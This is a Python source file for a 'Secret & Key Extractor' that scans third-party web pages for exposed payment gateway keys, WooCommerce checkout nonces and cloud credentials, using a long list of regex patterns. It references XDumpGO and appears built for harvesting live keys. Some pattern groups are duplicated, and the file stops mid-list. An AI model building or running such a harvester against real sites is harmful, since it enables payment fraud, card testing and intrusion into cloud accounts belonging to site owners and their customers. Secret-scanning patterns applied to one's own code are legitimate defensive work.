"""
Secret & Key Extractor — Extract API keys, gateway credentials, secrets from web pages

Scans HTML source code for exposed:
1. Payment gateway keys (Stripe pk/sk, Braintree, PayPal, Square, Adyen, etc.)
2. Cloud credentials (AWS, GCP, Azure)
3. Database connection strings
4. API tokens & OAuth secrets
5. .env file contents
6. Hardcoded passwords
"""

import re
import asyncio
import aiohttp
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from loguru import logger


@dataclass
class ExtractedSecret:
    """A single extracted secret/key."""
    url: str
    type: str  # stripe_pk, stripe_sk, aws_key, etc.
    category: str  # gateway, cloud, database, api, credential
    key_name: str  # Human-readable name
    value: str  # The actual secret value
    context: str = ""  # Surrounding text for validation
    confidence: float = 0.9
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class SecretExtractor:
    """Extracts secrets, API keys, and gateway credentials from web pages.
    
    XDumpGO-complete scanner with 250+ patterns covering:
    - 60+ Payment gateways (Stripe, Braintree, PayPal, Square, Adyen, Razorpay, etc.)
    - 30+ Cloud providers (AWS, GCP, Azure, Firebase, Supabase, etc.)
    - 50+ API services (Twilio, SendGrid, OpenAI, Algolia, etc.)
    - 20+ Crypto/Blockchain (Coinbase, Infura, Alchemy, etc.)
    - 30+ Webhooks & Integrations
    - Exposed files, configs, credentials
    """
    
    # Secret patterns: (name, category, type, regex, confidence)
    PATTERNS = [
        # =====================================================================
        # =============== PAYMENT GATEWAY KEYS (60+ PATTERNS) =================
        # =====================================================================
        
        # ------------ STRIPE (Full Coverage) ------------
        ("Stripe Publishable Key", "gateway", "stripe_pk",
         re.compile(r'(?:pk_live_[A-Za-z0-9]{20,99})', re.I), 0.99),
        ("Stripe Secret Key", "gateway", "stripe_sk",
         re.compile(r'(?:sk_live_[A-Za-z0-9]{20,99})', re.I), 0.99),
        ("Stripe Restricted Key", "gateway", "stripe_rk",
         re.compile(r'(?:rk_live_[A-Za-z0-9]{20,99})', re.I), 0.99),
        ("Stripe Webhook Secret", "gateway", "stripe_whsec",
         re.compile(r'(?:whsec_[A-Za-z0-9]{20,99})', re.I), 0.95),
        ("Stripe Test PK", "gateway", "stripe_pk_test",
         re.compile(r'(?:pk_test_[A-Za-z0-9]{20,99})', re.I), 0.80),
        ("Stripe Test SK", "gateway", "stripe_sk_test",
         re.compile(r'(?:sk_test_[A-Za-z0-9]{20,99})', re.I), 0.85),
        ("Stripe Connect Account", "gateway", "stripe_acct",
         re.compile(r'(?:acct_[A-Za-z0-9]{12,30})', re.I), 0.85),
        ("Stripe Payment Intent", "gateway", "stripe_pi",
         re.compile(r'(?:pi_[A-Za-z0-9]{20,50})', re.I), 0.80),
        ("Stripe Client Secret", "gateway", "stripe_client_secret",
         re.compile(r'(?:pi_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)', re.I), 0.90),
        ("Stripe Setup Intent", "gateway", "stripe_seti",
         re.compile(r'(?:seti_[A-Za-z0-9]{20,50})', re.I), 0.85),
        ("Stripe Customer ID", "gateway", "stripe_cus",
         re.compile(r'(?:cus_[A-Za-z0-9]{14,30})', re.I), 0.75),
        ("Stripe Subscription ID", "gateway", "stripe_sub",
         re.compile(r'(?:sub_[A-Za-z0-9]{14,30})', re.I), 0.75),
        ("Stripe Price ID", "gateway", "stripe_price",
         re.compile(r'(?:price_[A-Za-z0-9]{14,30})', re.I), 0.70),
        ("Stripe Product ID", "gateway", "stripe_prod",
         re.compile(r'(?:prod_[A-Za-z0-9]{14,30})', re.I), 0.70),
        ("Stripe Invoice ID", "gateway", "stripe_inv",
         re.compile(r'(?:in_[A-Za-z0-9]{14,30})', re.I), 0.70),
        ("Stripe Charge ID", "gateway", "stripe_ch",
         re.compile(r'(?:ch_[A-Za-z0-9]{14,30})', re.I), 0.75),
        ("Stripe Payout ID", "gateway", "stripe_po",
         re.compile(r'(?:po_[A-Za-z0-9]{14,30})', re.I), 0.80),
        ("Stripe Transfer ID", "gateway", "stripe_tr",
         re.compile(r'(?:tr_[A-Za-z0-9]{14,30})', re.I), 0.75),
        
        # ------------ BRAINTREE ------------
        ("Braintree Tokenization Key", "gateway", "braintree_token",
         re.compile(r'(?:sandbox|production)_[a-z0-9]{8}_[a-z0-9]{16,32}', re.I), 0.90),
        ("Braintree Merchant ID", "gateway", "braintree_merchant",
         re.compile(r'(?:merchant[_\-]?id|merchantId)["\s:=]+["\']?([a-z0-9]{12,20})["\']?', re.I), 0.75),
        ("Braintree Client Token", "gateway", "braintree_client",
         re.compile(r'(?:braintree[._-]?(?:client[._-]?)?token)["\s:=]+["\']([A-Za-z0-9+/=]{50,500})["\']', re.I), 0.85),
        ("Braintree Private Key", "gateway", "braintree_private",
         re.compile(r'braintree[._-]?private[._-]?key["\s:=]+["\']([A-Za-z0-9]{30,100})["\']', re.I), 0.90),
        ("Braintree Public Key", "gateway", "braintree_public",
         re.compile(r'braintree[._-]?public[._-]?key["\s:=]+["\']([A-Za-z0-9]{30,100})["\']', re.I), 0.85),
        
        # ------------ PAYPAL (Full Coverage) ------------
        ("PayPal Client ID", "gateway", "paypal_client",
         re.compile(r'(?:paypal|pp)[._-]?client[._-]?id["\s:=]+["\']?([A-Za-z0-9_-]{50,100})["\']?', re.I), 0.85),
        ("PayPal Secret", "gateway", "paypal_secret",
         re.compile(r'(?:paypal|pp)[._-]?(?:secret|client_secret)["\s:=]+["\']?([A-Za-z0-9_-]{50,100})["\']?', re.I), 0.90),
        ("PayPal SDK", "gateway", "paypal_sdk",
         re.compile(r'paypal\.com/sdk/js\?client-id=([A-Za-z0-9_-]{30,100})', re.I), 0.85),
        ("PayPal Merchant ID", "gateway", "paypal_merchant",
         re.compile(r'(?:paypal[._-]?)?merchant[._-]?id["\s:=]+["\']([A-Za-z0-9]{13,20})["\']', re.I), 0.80),
        ("PayPal Access Token", "gateway", "paypal_access_token",
         re.compile(r'A21AA[A-Za-z0-9_-]{50,100}', re.I), 0.85),
        ("PayPal BN Code", "gateway", "paypal_bn",
         re.compile(r'bn[_-]?code["\s:=]+["\']([A-Za-z0-9_-]{20,60})["\']', re.I), 0.70),
        
        # ------------ SQUARE (Full Coverage) ------------
        ("Square Access Token", "gateway", "square_token",
         re.compile(r'(?:sq0atp-[A-Za-z0-9_-]{22,60})', re.I), 0.95),
        ("Square OAuth Secret", "gateway", "square_secret",
         re.compile(r'(?:sq0csp-[A-Za-z0-9_-]{40,60})', re.I), 0.95),
        ("Square Application ID", "gateway", "square_app",
         re.compile(r'(?:sq0idp-[A-Za-z0-9_-]{22,60})', re.I), 0.90),
        ("Square Location ID", "gateway", "square_location",
         re.compile(r'(?:location[._-]?id|locationId)["\s:=]+["\']([A-Za-z0-9]{10,20})["\']', re.I), 0.70),
        
        # ------------ ADYEN ------------
        ("Adyen API Key", "gateway", "adyen_key",
         re.compile(r'(?:adyen)[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{30,100})["\']?', re.I), 0.85),
        ("Adyen Client Key", "gateway", "adyen_client",
         re.compile(r'(?:adyen)[._-]?(?:client[._-]?)?key["\s:=]+["\']?((?:test|live)_[A-Za-z0-9]{20,50})["\']?', re.I), 0.85),
        ("Adyen Merchant Account", "gateway", "adyen_merchant",
         re.compile(r'merchantAccount["\s:=]+["\']([A-Za-z0-9_-]{5,50})["\']', re.I), 0.80),
        
        # ------------ RAZORPAY (XDumpGO!) ------------
        ("Razorpay Key ID", "gateway", "razorpay_key",
         re.compile(r'rzp_(?:live|test)_[A-Za-z0-9]{14,20}', re.I), 0.95),
        ("Razorpay Secret", "gateway", "razorpay_secret",
         re.compile(r'(?:razorpay[._-]?)?(?:key[._-]?)?secret["\s:=]+["\']([A-Za-z0-9]{20,50})["\']', re.I), 0.85),
        
        # ------------ MOLLIE ------------
        ("Mollie API Key Live", "gateway", "mollie_live",
         re.compile(r'live_[A-Za-z0-9]{30,50}', re.I), 0.80),
        ("Mollie API Key Test", "gateway", "mollie_test",
         re.compile(r'test_[A-Za-z0-9]{30,50}', re.I), 0.70),
        
        # ------------ KLARNA ------------
        ("Klarna API Key", "gateway", "klarna_key",
         re.compile(r'klarna[._-]?(?:api[._-]?)?(?:key|secret)["\s:=]+["\']([A-Za-z0-9_-]{30,100})["\']', re.I), 0.85),
        ("Klarna Merchant ID", "gateway", "klarna_merchant",
         re.compile(r'klarna[._-]?merchant[._-]?id["\s:=]+["\']([A-Za-z0-9]{5,20})["\']', re.I), 0.80),
        
        # ------------ AFFIRM ------------
        ("Affirm Public Key", "gateway", "affirm_public",
         re.compile(r'affirm[._-]?public[._-]?(?:api[._-]?)?key["\s:=]+["\']([A-Za-z0-9_-]{30,60})["\']', re.I), 0.85),
        ("Affirm Private Key", "gateway", "affirm_private",
         re.compile(r'affirm[._-]?private[._-]?(?:api[._-]?)?key["\s:=]+["\']([A-Za-z0-9_-]{30,60})["\']', re.I), 0.90),
        
        # ------------ AFTERPAY/CLEARPAY ------------
        ("Afterpay Merchant ID", "gateway", "afterpay_merchant",
         re.compile(r'afterpay[._-]?merchant[._-]?id["\s:=]+["\']([A-Za-z0-9]{8,30})["\']', re.I), 0.85),
        ("Afterpay Secret", "gateway", "afterpay_secret",
         re.compile(r'afterpay[._-]?(?:api[._-]?)?secret["\s:=]+["\']([A-Za-z0-9_-]{30,100})["\']', re.I), 0.90),
        
        # ------------ SEZZLE ------------
        ("Sezzle Public Key", "gateway", "sezzle_public",
         re.compile(r'sezzle[._-]?public[._-]?key["\s:=]+["\']([A-Za-z0-9_-]{30,60})["\']', re.I), 0.85),
        ("Sezzle Private Key", "gateway", "sezzle_private",
         re.compile(r'sezzle[._-]?private[._-]?key["\s:=]+["\']([A-Za-z0-9_-]{30,60})["\']', re.I), 0.90),
        
        # ------------ AUTHORIZE.NET ------------
        ("Authorize.net Login ID", "gateway", "authnet_login",
         re.compile(r'(?:x_login|api_login_id|apiLoginID)["\s:=]+["\']?([A-Za-z0-9]{8,25})["\']?', re.I), 0.80),
        ("Authorize.net Transaction Key", "gateway", "authnet_key",
         re.compile(r'(?:x_tran_key|transaction_key|transactionKey)["\s:=]+["\']?([A-Za-z0-9]{12,20})["\']?', re.I), 0.85),
        
        # ------------ CHECKOUT.COM ------------
        ("Checkout.com PK", "gateway", "checkout_pk",
         re.compile(r'pk_(?:sbox_|test_|live_)?[a-z0-9]{20,60}', re.I), 0.80),
        ("Checkout.com SK", "gateway", "checkout_sk",
         re.compile(r'sk_(?:sbox_|test_|live_)?[a-z0-9]{20,60}', re.I), 0.85),
        
        # ------------ WORLDPAY ------------
        ("Worldpay Service Key", "gateway", "worldpay_key",
         re.compile(r'(?:worldpay|wp)[._-]?(?:service[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{20,80})["\']?', re.I), 0.85),
        ("Worldpay Client Key", "gateway", "worldpay_client",
         re.compile(r'(?:worldpay|wp)[._-]?client[._-]?key["\s:=]+["\']?([A-Za-z0-9_-]{20,80})["\']?', re.I), 0.85),
        
        # ------------ NMI ------------
        ("NMI Security Key", "gateway", "nmi_key",
         re.compile(r'(?:nmi|network_merchants)[._-]?(?:security[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{20,60})["\']?', re.I), 0.80),
        ("NMI Token", "gateway", "nmi_token",
         re.compile(r'token(?:ization)?[._-]?key["\s:=]+["\']?([A-Za-z0-9_-]{20,60})["\']?', re.I), 0.75),
        
        # ------------ 2CHECKOUT/VERIFONE ------------
        ("2Checkout Merchant Code", "gateway", "2checkout_merchant",
         re.compile(r'(?:2checkout|tco|verifone)[._-]?(?:merchant|seller)[._-]?(?:code|id)["\s:=]+["\']?([A-Za-z0-9]{6,20})["\']?', re.I), 0.75),
        ("2Checkout Secret Key", "gateway", "2checkout_secret",
         re.compile(r'(?:2checkout|tco)[._-]?secret[._-]?(?:key|word)["\s:=]+["\']?([A-Za-z0-9!@#$%^&*]{10,50})["\']?', re.I), 0.85),
        
        # ------------ PAYU ------------
        ("PayU Merchant Key", "gateway", "payu_key",
         re.compile(r'payu[._-]?merchant[._-]?key["\s:=]+["\']?([A-Za-z0-9]{6,20})["\']?', re.I), 0.85),
        ("PayU Salt", "gateway", "payu_salt",
         re.compile(r'payu[._-]?(?:merchant[._-]?)?salt["\s:=]+["\']?([A-Za-z0-9]{6,50})["\']?', re.I), 0.85),
        
        # ------------ CYBERSOURCE ------------
        ("CyberSource Merchant ID", "gateway", "cybersource_merchant",
         re.compile(r'cybersource[._-]?merchant[._-]?id["\s:=]+["\']?([A-Za-z0-9_-]{10,50})["\']?', re.I), 0.85),
        ("CyberSource Transaction Key", "gateway", "cybersource_key",
         re.compile(r'cybersource[._-]?transaction[._-]?key["\s:=]+["\']?([A-Za-z0-9+/=]{80,200})["\']?', re.I), 0.90),
        
        # ------------ FIRST DATA/FISERV ------------
        ("First Data Merchant ID", "gateway", "firstdata_merchant",
         re.compile(r'(?:first[._-]?data|fiserv)[._-]?merchant[._-]?id["\s:=]+["\']?([A-Za-z0-9_-]{10,30})["\']?', re.I), 0.85),
        ("First Data API Secret", "gateway", "firstdata_secret",
         re.compile(r'(?:first[._-]?data|fiserv)[._-]?(?:api[._-]?)?secret["\s:=]+["\']?([A-Za-z0-9_-]{20,60})["\']?', re.I), 0.90),
        
        # ------------ GLOBAL PAYMENTS/TSYS ------------
        ("Global Payments API Key", "gateway", "globalpay_key",
         re.compile(r'(?:global[._-]?payments?|tsys)[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{20,60})["\']?', re.I), 0.85),
        ("Global Payments Merchant ID", "gateway", "globalpay_merchant",
         re.compile(r'(?:global[._-]?payments?|tsys)[._-]?merchant[._-]?id["\s:=]+["\']?([A-Za-z0-9_-]{10,30})["\']?', re.I), 0.80),
        
        # ------------ PAYSAFE/NETELLER/SKRILL ------------
        ("Paysafe API Key", "gateway", "paysafe_key",
         re.compile(r'paysafe[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{30,60})["\']?', re.I), 0.85),
        ("Skrill Merchant ID", "gateway", "skrill_merchant",
         re.compile(r'skrill[._-]?(?:merchant[._-]?)?(?:id|email)["\s:=]+["\']?([A-Za-z0-9@._-]{5,50})["\']?', re.I), 0.80),
        ("Skrill Secret Word", "gateway", "skrill_secret",
         re.compile(r'skrill[._-]?(?:secret[._-]?)?word["\s:=]+["\']?([A-Za-z0-9!@#$%^&*]{6,50})["\']?', re.I), 0.85),
        
        # ------------ GOCARDLESS ------------
        ("GoCardless Access Token", "gateway", "gocardless_token",
         re.compile(r'(?:gocardless[._-]?)?access[._-]?token["\s:=]+["\']?(live_[A-Za-z0-9_-]{40,80})["\']?', re.I), 0.90),
        
        # ------------ RECURLY ------------
        ("Recurly API Key", "gateway", "recurly_key",
         re.compile(r'recurly[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{32,50})["\']?', re.I), 0.85),
        ("Recurly Public Key", "gateway", "recurly_public",
         re.compile(r'recurly[._-]?public[._-]?key["\s:=]+["\']?([A-Za-z0-9_-]{20,40})["\']?', re.I), 0.80),
        
        # ------------ CHARGEBEE ------------
        ("Chargebee API Key", "gateway", "chargebee_key",
         re.compile(r'chargebee[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{40,80})["\']?', re.I), 0.85),
        ("Chargebee Site", "gateway", "chargebee_site",
         re.compile(r'chargebee[._-]?site["\s:=]+["\']?([A-Za-z0-9_-]{5,30})["\']?', re.I), 0.75),
        
        # ------------ PADDLE ------------
        ("Paddle Vendor ID", "gateway", "paddle_vendor",
         re.compile(r'paddle[._-]?vendor[._-]?id["\s:=]+["\']?(\d{4,10})["\']?', re.I), 0.85),
        ("Paddle API Key", "gateway", "paddle_key",
         re.compile(r'paddle[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{30,80})["\']?', re.I), 0.90),
        
        # ------------ GUMROAD ------------
        ("Gumroad Access Token", "gateway", "gumroad_token",
         re.compile(r'gumroad[._-]?(?:access[._-]?)?token["\s:=]+["\']?([A-Za-z0-9_-]{30,60})["\']?', re.I), 0.85),
        
        # ------------ LEMONSQUEEZY ------------
        ("LemonSqueezy API Key", "gateway", "lemonsqueezy_key",
         re.compile(r'(?:lemon[._-]?squeezy|lmsqueezy)[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{30,80})["\']?', re.I), 0.85),
        
        # ------------ FASTSPRING ------------
        ("FastSpring API Key", "gateway", "fastspring_key",
         re.compile(r'fastspring[._-]?(?:api[._-]?)?(?:key|secret)["\s:=]+["\']?([A-Za-z0-9_-]{20,60})["\']?', re.I), 0.85),
        
        # ------------ BLUESNAP ------------
        ("BlueSnap API Password", "gateway", "bluesnap_pass",
         re.compile(r'bluesnap[._-]?(?:api[._-]?)?(?:password|key)["\s:=]+["\']?([A-Za-z0-9!@#$%^&*_-]{10,50})["\']?', re.I), 0.85),
        
        # ------------ SPREEDLY ------------
        ("Spreedly Environment Key", "gateway", "spreedly_env",
         re.compile(r'spreedly[._-]?(?:environment[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{20,40})["\']?', re.I), 0.85),
        ("Spreedly Access Secret", "gateway", "spreedly_secret",
         re.compile(r'spreedly[._-]?(?:access[._-]?)?secret["\s:=]+["\']?([A-Za-z0-9]{30,60})["\']?', re.I), 0.90),
        
        # ------------ PLAID (Banking) ------------
        ("Plaid Client ID", "gateway", "plaid_client",
         re.compile(r'plaid[._-]?client[._-]?id["\s:=]+["\']?([A-Za-z0-9]{20,30})["\']?', re.I), 0.85),
        ("Plaid Secret", "gateway", "plaid_secret",
         re.compile(r'plaid[._-]?secret["\s:=]+["\']?([A-Za-z0-9]{30,50})["\']?', re.I), 0.90),
        ("Plaid Public Key", "gateway", "plaid_public",
         re.compile(r'plaid[._-]?public[._-]?key["\s:=]+["\']?([A-Za-z0-9]{20,40})["\']?', re.I), 0.80),
        
        # ------------ WEPAY ------------
        ("WePay Client ID", "gateway", "wepay_client",
         re.compile(r'wepay[._-]?client[._-]?id["\s:=]+["\']?(\d{5,15})["\']?', re.I), 0.85),
        ("WePay Access Token", "gateway", "wepay_token",
         re.compile(r'wepay[._-]?(?:access[._-]?)?token["\s:=]+["\']?([A-Za-z0-9_-]{30,80})["\']?', re.I), 0.90),
        
        # ------------ DWOLLA (ACH) ------------
        ("Dwolla API Key", "gateway", "dwolla_key",
         re.compile(r'dwolla[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{40,60})["\']?', re.I), 0.85),
        ("Dwolla Secret", "gateway", "dwolla_secret",
         re.compile(r'dwolla[._-]?(?:api[._-]?)?secret["\s:=]+["\']?([A-Za-z0-9_-]{40,60})["\']?', re.I), 0.90),
        
        # ------------ INSTAMOJO (India) ------------
        ("Instamojo API Key", "gateway", "instamojo_key",
         re.compile(r'instamojo[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{30,50})["\']?', re.I), 0.85),
        ("Instamojo Auth Token", "gateway", "instamojo_token",
         re.compile(r'instamojo[._-]?(?:auth[._-]?)?token["\s:=]+["\']?([A-Za-z0-9]{30,50})["\']?', re.I), 0.90),
        
        # ------------ PAYTM (India) ------------
        ("Paytm Merchant Key", "gateway", "paytm_key",
         re.compile(r'paytm[._-]?merchant[._-]?key["\s:=]+["\']?([A-Za-z0-9@#$%&*_]{10,30})["\']?', re.I), 0.85),
        ("Paytm Merchant ID", "gateway", "paytm_mid",
         re.compile(r'paytm[._-]?(?:merchant[._-]?)?(?:mid|id)["\s:=]+["\']?([A-Za-z0-9]{10,30})["\']?', re.I), 0.85),
        
        # ------------ PHONEPE (India) ------------
        ("PhonePe Merchant ID", "gateway", "phonepe_merchant",
         re.compile(r'phonepe[._-]?merchant[._-]?id["\s:=]+["\']?([A-Za-z0-9]{10,30})["\']?', re.I), 0.85),
        ("PhonePe Salt Key", "gateway", "phonepe_salt",
         re.compile(r'phonepe[._-]?salt[._-]?key["\s:=]+["\']?([A-Za-z0-9-]{30,50})["\']?', re.I), 0.90),
        
        # ------------ WooCommerce specific ------------
        ("WC Stripe PK (UPE)", "gateway", "stripe_pk",
         re.compile(r'wc_stripe_(?:upe_)?params\s*=\s*\{[^}]*?"key"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]{20,99})"', re.I), 0.99),
        ("WC Stripe PMC", "gateway", "stripe_pmc",
         re.compile(r'paymentMethodConfigurationParentId"\s*:\s*"(pmc_[A-Za-z0-9]{20,40})"', re.I), 0.90),
        ("WC Stripe Account", "gateway", "stripe_acct",
         re.compile(r'accountDescriptor"\s*:\s*"([^"]{2,60})"', re.I), 0.70),
        ("WC Braintree PayPal Gateway", "gateway", "braintree_paypal",
         re.compile(r'WC_Braintree_(?:PayPal|Credit_Card)_Payment_Form_Handler\s*\(\s*(\{[^)]{50,500})', re.I), 0.90),
        ("WC Braintree Client Token Nonce", "gateway", "braintree_token_nonce",
         re.compile(r'client_token_nonce"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.85),
        
        # ------------ WordPress AJAX & Nonces ------------
        ("WP AJAX URL", "config", "wp_ajax_url",
         re.compile(r'(?:ajax_url|ajaxurl)\s*[=:]\s*["\']?(https?://[^"\' ]+admin-ajax\.php)', re.I), 0.80),
        ("WP Nonce", "config", "wp_nonce",
         re.compile(r'(?:_wpnonce|nonce|security)"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.70),
        ("WC Checkout Nonce", "gateway", "wc_checkout_nonce",
         re.compile(r'(?:createPaymentIntentNonce|updatePaymentIntentNonce|createSetupIntentNonce)"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.85),
        ("WC AJAX URL", "config", "wc_ajax_url",
         re.compile(r'wc_ajax_url"\s*:\s*"([^"]+)"', re.I), 0.75),
        
        # ------------ Generic payment ------------
        ("Publishable Key (Generic)", "gateway", "generic_pk",
         re.compile(r'(?:publishable[._-]?key|public[._-]?key)["\s:=]+["\']?([A-Za-z0-9_-]{20,100})["\']?', re.I), 0.70),
        ("Secret Key (Generic)", "gateway", "generic_sk",
         re.compile(r'(?:secret[._-]?key)["\s:=]+["\']?([A-Za-z0-9_-]{20,100})["\']?', re.I), 0.75),
        ("Merchant ID (Generic)", "gateway", "generic_merchant",
         re.compile(r'(?:merchant[._-]?id)["\s:=]+["\']?([A-Za-z0-9_-]{8,40})["\']?', re.I), 0.60),
        
        # ------------ ADYEN ------------
        ("Adyen API Key", "gateway", "adyen_api",
         re.compile(r'(?:adyen)[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{30,100})["\']?', re.I), 0.85),
        ("Adyen Client Key", "gateway", "adyen_client",
         re.compile(r'(?:adyen)[._-]?(?:client[._-]?)?key["\s:=]+["\']?((?:test|live)_[A-Za-z0-9]{20,50})["\']?', re.I), 0.85),
        
        # Authorize.net
        ("Authorize.net Login ID", "gateway", "authnet_login",
         re.compile(r'(?:x_login|api_login_id|apiLoginID)["\s:=]+["\']?([A-Za-z0-9]{8,25})["\']?', re.I), 0.80),
        ("Authorize.net Transaction Key", "gateway", "authnet_key",
         re.compile(r'(?:x_tran_key|transaction_key|transactionKey)["\s:=]+["\']?([A-Za-z0-9]{12,20})["\']?', re.I), 0.85),
        
        # Checkout.com
        ("Checkout.com PK", "gateway", "checkout_pk",
         re.compile(r'pk_(?:sbox_|test_|live_)?[a-z0-9]{20,60}', re.I), 0.80),
        ("Checkout.com SK", "gateway", "checkout_sk",
         re.compile(r'sk_(?:sbox_|test_|live_)?[a-z0-9]{20,60}', re.I), 0.85),
        
        # Worldpay
        ("Worldpay Service Key", "gateway", "worldpay_key",
         re.compile(r'(?:worldpay|wp)[._-]?(?:service[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{20,80})["\']?', re.I), 0.85),
        
        # NMI
        ("NMI Security Key", "gateway", "nmi_key",
         re.compile(r'(?:nmi|network_merchants)[._-]?(?:security[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{20,60})["\']?', re.I), 0.80),
        
        # 2Checkout
        ("2Checkout Merchant Code", "gateway", "2checkout_merchant",
         re.compile(r'(?:2checkout|tco)[._-]?(?:merchant|seller)[._-]?(?:code|id)["\s:=]+["\']?([A-Za-z0-9]{6,20})["\']?', re.I), 0.75),
        
        # WooCommerce Stripe (embedded in JS vars)
        ("WC Stripe PK (UPE)", "gateway", "stripe_pk",
         re.compile(r'wc_stripe_(?:upe_)?params\s*=\s*\{[^}]*?"key"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]{20,99})"', re.I), 0.99),
        ("WC Stripe PMC", "gateway", "stripe_pmc",
         re.compile(r'paymentMethodConfigurationParentId"\s*:\s*"(pmc_[A-Za-z0-9]{20,40})"', re.I), 0.90),
        ("WC Stripe Account", "gateway", "stripe_acct",
         re.compile(r'accountDescriptor"\s*:\s*"([^"]{2,60})"', re.I), 0.70),
        
        # WooCommerce Braintree PayPal
        ("WC Braintree PayPal Gateway", "gateway", "braintree_paypal",
         re.compile(r'WC_Braintree_(?:PayPal|Credit_Card)_Payment_Form_Handler\s*\(\s*(\{[^)]{50,500})', re.I), 0.90),
        ("WC Braintree Client Token Nonce", "gateway", "braintree_token_nonce",
         re.compile(r'client_token_nonce"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.85),
        
        # WordPress AJAX & Nonces
        ("WP AJAX URL", "config", "wp_ajax_url",
         re.compile(r'(?:ajax_url|ajaxurl)\s*[=:]\s*["\']?(https?://[^"\' ]+admin-ajax\.php)', re.I), 0.80),
        ("WP Nonce", "config", "wp_nonce",
         re.compile(r'(?:_wpnonce|nonce|security)"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.70),
        ("WC Checkout Nonce", "gateway", "wc_checkout_nonce",
         re.compile(r'(?:createPaymentIntentNonce|updatePaymentIntentNonce|createSetupIntentNonce)"\s*:\s*"([a-f0-9]{8,20})"', re.I), 0.85),
        ("WC AJAX URL", "config", "wc_ajax_url",
         re.compile(r'wc_ajax_url"\s*:\s*"([^"]+)"', re.I), 0.75),
        
        # Generic payment
        ("Publishable Key (Generic)", "gateway", "generic_pk",
         re.compile(r'(?:publishable[._-]?key|public[._-]?key)["\s:=]+["\']?([A-Za-z0-9_-]{20,100})["\']?', re.I), 0.70),
        ("Secret Key (Generic)", "gateway", "generic_sk",
         re.compile(r'(?:secret[._-]?key)["\s:=]+["\']?([A-Za-z0-9_-]{20,100})["\']?', re.I), 0.75),
        ("Merchant ID (Generic)", "gateway", "generic_merchant",
         re.compile(r'(?:merchant[._-]?id)["\s:=]+["\']?([A-Za-z0-9_-]{8,40})["\']?', re.I), 0.60),
        
        # =====================================================================
        # =============== CLOUD CREDENTIALS (30+ PROVIDERS) =================
        # =====================================================================
        
        # ------------ AWS (Full Coverage) ------------
        ("AWS Access Key ID", "cloud", "aws_access",
         re.compile(r'(?:AKIA[0-9A-Z]{16})', re.I), 0.95),
        ("AWS Secret Key", "cloud", "aws_secret",
         re.compile(r'(?:aws[._-]?secret[._-]?(?:access[._-]?)?key)["\s:=]+["\']?([A-Za-z0-9/+=]{40})["\']?', re.I), 0.90),
        ("AWS Session Token", "cloud", "aws_session",
         re.compile(r'(?:aws[._-]?session[._-]?token)["\s:=]+["\']?([A-Za-z0-9/+=]{100,500})["\']?', re.I), 0.85),
        ("AWS Account ID", "cloud", "aws_account",
         re.compile(r'(?:aws[._-]?account[._-]?id)["\s:=]+["\']?(\d{12})["\']?', re.I), 0.80),
        ("AWS ARN", "cloud", "aws_arn",
         re.compile(r'arn:aws:[a-z0-9-]+:[a-z0-9-]*:\d{12}:[a-zA-Z0-9/_-]+', re.I), 0.85),
        ("S3 Bucket URL", "cloud", "s3_bucket",
         re.compile(r'(?:https?://)?[a-z0-9.-]+\.s3[.-](?:[a-z0-9-]+\.)?amazonaws\.com', re.I), 0.80),
        ("S3 Bucket Name", "cloud", "s3_bucket_name",
         re.compile(r's3://([a-z0-9.-]{3,63})', re.I), 0.85),
        
        # ------------ GCP (Full Coverage) ------------
        ("GCP API Key", "cloud", "gcp_key",
         re.compile(r'AIza[0-9A-Za-z_-]{35}', re.I), 0.90),
        ("GCP Service Account", "cloud", "gcp_service",
         re.compile(r'[a-z0-9-]+@[a-z0-9-]+\.iam\.gserviceaccount\.com', re.I), 0.85),
        ("GCP OAuth Client ID", "cloud", "gcp_oauth",
         re.compile(r'\d+-[a-z0-9]+\.apps\.googleusercontent\.com', re.I), 0.85),
        ("GCS Bucket URL", "cloud", "gcs_bucket",
         re.compile(r'(?:https?://)?storage\.googleapis\.com/[a-z0-9._-]+', re.I), 0.80),
        ("GCS Bucket Name", "cloud", "gcs_bucket_name",
         re.compile(r'gs://([a-z0-9._-]{3,63})', re.I), 0.85),
        ("Firebase API Key", "cloud", "firebase_key",
         re.compile(r'(?:firebase[._-]?)?api[._-]?key["\s:=]+["\']?(AIza[0-9A-Za-z_-]{35})["\']?', re.I), 0.90),
        ("Firebase Database URL", "cloud", "firebase_db",
         re.compile(r'https://[a-z0-9-]+(?:-default-rtdb)?\.(?:firebaseio|firebasedatabase)\.(?:com|app)', re.I), 0.85),
        ("Firebase Project ID", "cloud", "firebase_project",
         re.compile(r'firebase[._-]?project[._-]?id["\s:=]+["\']?([a-z0-9-]{6,30})["\']?', re.I), 0.80),
        
        # ------------ Azure (Full Coverage) ------------
        ("Azure Storage Key", "cloud", "azure_storage",
         re.compile(r'(?:DefaultEndpointsProtocol|AccountKey)[=][A-Za-z0-9+/=]{40,100}', re.I), 0.90),
        ("Azure Connection String", "cloud", "azure_conn",
         re.compile(r'(?:Server|Data Source)=tcp:[a-z0-9.-]+\.database\.windows\.net', re.I), 0.85),
        ("Azure Blob URL", "cloud", "azure_blob",
